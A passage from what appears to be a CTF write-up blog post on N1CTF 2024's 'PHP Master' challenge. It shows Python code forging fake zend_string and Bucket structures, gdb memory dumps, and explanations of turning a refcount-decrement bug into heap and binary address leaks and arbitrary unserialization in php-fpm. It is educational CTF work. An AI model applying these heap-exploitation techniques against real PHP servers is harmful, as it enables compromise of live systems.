<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zend_string_header = p32(<span class="number">0x1</span>) + p32(<span class="number">0x5</span>) + p64(<span class="number">0x00c0ffee00c0ffee</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">fake_arData  = zend_string_header </span><br><span class="line">fake_arData += (<span class="number">16</span> * <span class="number">4</span> - <span class="built_in">len</span>(zend_string_header)) * <span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">fake_arData += fake_bucket(<span class="number">0xaaaabbbbccccdddd</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0xaabbccdd</span>, <span class="number">0</span>) * <span class="number">8</span> </span><br><span class="line"></span><br><span class="line">insert(<span class="number">0</span>, fake_arData[<span class="number">0x18</span>:-<span class="number">1</span>])       <span class="comment"># 0x18 is the size of zend_string header,</span></span><br><span class="line">                                      <span class="comment"># -1 to remove the last byte so we can have</span></span><br><span class="line">                                      <span class="comment"># _ZSTR_STRUCT_SIZE(len) == 0x140-0x18</span></span><br></pre></td></tr></table></figure>
<p>Now we can successfully reclaim the memory and craft fake Bucket structure.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p ((Bucket *)0x7fc00d46f980)[5]</span><br><span class="line">$211 = &#123;</span><br><span class="line">  val = &#123;</span><br><span class="line">    value = &#123;</span><br><span class="line">      lval = 0xaaaabbbbccccdddd,</span><br><span class="line">      dval = -3.7299638781336413e-103,</span><br><span class="line">      counted = 0xaaaabbbbccccdddd,</span><br><span class="line">      str = 0xaaaabbbbccccdddd,</span><br><span class="line">      arr = 0xaaaabbbbccccdddd,</span><br><span class="line">      obj = 0xaaaabbbbccccdddd,</span><br><span class="line">      res = 0xaaaabbbbccccdddd,</span><br><span class="line">      ref = 0xaaaabbbbccccdddd,</span><br><span class="line">      ast = 0xaaaabbbbccccdddd,</span><br><span class="line">      zv = 0xaaaabbbbccccdddd,</span><br><span class="line">      ptr = 0xaaaabbbbccccdddd,</span><br><span class="line">      ce = 0xaaaabbbbccccdddd,</span><br><span class="line">      func = 0xaaaabbbbccccdddd,</span><br><span class="line">      ww = &#123;</span><br><span class="line">        w1 = 0xccccdddd,</span><br><span class="line">        w2 = 0xaaaabbbb</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    u1 = &#123;</span><br><span class="line">      type_info = 0x5,</span><br><span class="line">      v = &#123;</span><br><span class="line">        type = 0x5,</span><br><span class="line">        type_flags = 0x0,</span><br><span class="line">        u = &#123;</span><br><span class="line">          extra = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    u2 = &#123;</span><br><span class="line">      next = 0x0,</span><br><span class="line">      cache_slot = 0x0,</span><br><span class="line">      opline_num = 0x0,</span><br><span class="line">      lineno = 0x0,</span><br><span class="line">      num_args = 0x0,</span><br><span class="line">      fe_pos = 0x0,</span><br><span class="line">      fe_iter_idx = 0x0,</span><br><span class="line">      guard = 0x0,</span><br><span class="line">      constant_flags = 0x0,</span><br><span class="line">      extra = 0x0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  h = 0x5,</span><br><span class="line">  key = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Leak-something-first">Leak something first</h3>
<p><img src="image-20241112082253668.png" alt="image-leak-with-uaf"></p>
<h3 id="One-punch-leak-more">One punch, leak more</h3>
<p>The vulnerability actually gave us an arbitrary <code>ref_cnt--</code> primitive which can be applied to any <code>int</code>. What if we target the <code>$result</code> array?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/32xg $rdi</span><br><span class="line">0x7ffff545ab08:	0x00007ffff5470200	0x0000000000000106  &lt;--- zval at $result[0]</span><br><span class="line">0x7ffff545ab18:	0x00007ffff547e540	0x00007fff00000106</span><br><span class="line">0x7ffff545ab28:	0x8000d0b1d3799980	0x0000000000000007</span><br><span class="line">0x7ffff545ab38:	0x00746e65746e6f63	0x00007ffff545abe0</span><br><span class="line">0x7ffff545ab48:	0x0000000000000001	0x0000000000000000</span><br><span class="line">0x7ffff545ab58:	0x0000000000000020	0xeeeeeeeeeeeeeeee</span><br><span class="line">0x7ffff545ab68:	0x00007ffff545ab08	0xffffffff00000307</span><br><span class="line">0x7ffff545ab78:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff545ab88:	0x00007ffff5470210	0xffffffff00000307</span><br><span class="line">0x7ffff545ab98:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff545aba8:	0x00007ffff5470210	0xffffffff00000307</span><br><span class="line">0x7ffff545abb8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff545abc8:	0x00007ffff5470210	0xffffffff00000307</span><br><span class="line">0x7ffff545abd8:	0x0000005453000000	0x00007ffff545ac80</span><br><span class="line">0x7ffff545abe8:	0x8000d0b1d3799980	0x0000000000000007</span><br><span class="line">0x7ffff545abf8:	0x00746e65746e6f63	0x00007ffff545a8c0</span><br></pre></td></tr></table></figure>
<p><code>zend_string</code> is not a null-terminated string structure, instead, it contains a length field.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line">	<span class="keyword">size_t</span>            len;</span><br><span class="line">	<span class="keyword">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>If we subtract 1 from the <code>value.str</code> pointer in <code>zval</code>, we can have a 1 byte shift from the actually string object which means the length will be multiplied by 16 and we will be able to read a lot of data.</p>
<h2 id="Exploit">Exploit</h2>
<h3 id="A-failure">A failure</h3>
<p>We can leak address of zend heap, glibc heap, and, the base address of php-fpm with the <code>ref_cnt--</code> primitive. An intuitive approach is manipulating some function pointer to get arbitrary code execution in the context of php-fpm worker. But this is really difficult to achieve precisely. The php-fpm main process will fork several worker processes and since we can only substract 1 from a given address, it will be hard to precisely control the pointer since we have no idea about which worker is handling our request right now (well, as least when I wrote this down).</p>
<h3 id="Web-master-came-to-rescue">Web master came to rescue</h3>
<p>HTTP is a status less protocol, php can store the session data in <code>$_SESSION</code> hash table. The <code>DataForm</code> object will be serialized to a <code>zend_string</code> after handling the request. With our <code>ref_cnt--</code> primitive we can release this string and reclaim the memory with our <code>callback</code> string! That gives us an arbitrary unserialization primitive.</p>
<p><img src="image-20241112082313241.png" alt="image-uaf-session-data"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
      <!--
     --><li style="display: block;">
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Home</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../index.html">Home</a>
        </span>
      </li><!--
     --><li style="display: block;">
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Writing</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../archives/">Writing</a>
        </span>
      </li><!--
     --><li style="display: block;">
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Projects</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../https:/github.com/KpwnZ">Projects</a>
        </span>
      </li>
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">PHP Master Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-debug-the-challenge"><span class="toc-number">1.1.</span> <span class="toc-text">How to debug the challenge?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.2.</span> <span class="toc-text">Vulnerability?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-the-hash-table"><span class="toc-number">1.3.</span> <span class="toc-text">Control the hash table</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Leak-something-first"><span class="toc-number">1.3.1.</span> <span class="toc-text">Leak something first</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-punch-leak-more"><span class="toc-number">1.3.2.</span> <span class="toc-text">One punch, leak more</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#A-failure"><span class="toc-number">1.4.1.</span> <span class="toc-text">A failure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-master-came-to-rescue"><span class="toc-number">1.4.2.</span> <span class="toc-text">Web master came to rescue</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&text=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&is_video=false&description=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Save Me! Web Master: Pwn N1CTF 2024 PHP Master&body=Check out this article: https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&name=Save Me! Web Master: Pwn N1CTF 2024 PHP Master&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&t=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Xia0o0o0o
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        
        <!-- -->
        <!-- <li><a href="../../../../index.html">Home</a></li> -->
        <!-- -->

        
        <a href="../../../../index.html">Home</a>
        

       <!-- -->
       
        <!-- -->
        <!-- <li><a href="../../../../archives/">Writing</a></li> -->
        <!-- -->

        
        <a href="../../../../archives/">Writing</a>
        

       <!-- -->
       
        <!-- -->
        <!-- <li><a href="../../../../https:/github.com/KpwnZ">Projects</a></li> -->
        <!-- -->

        
        <a target="_blank" rel="noopener" href="https://github.com/KpwnZ">Projects</a>
        

       <!-- -->
       
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="../../../../js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
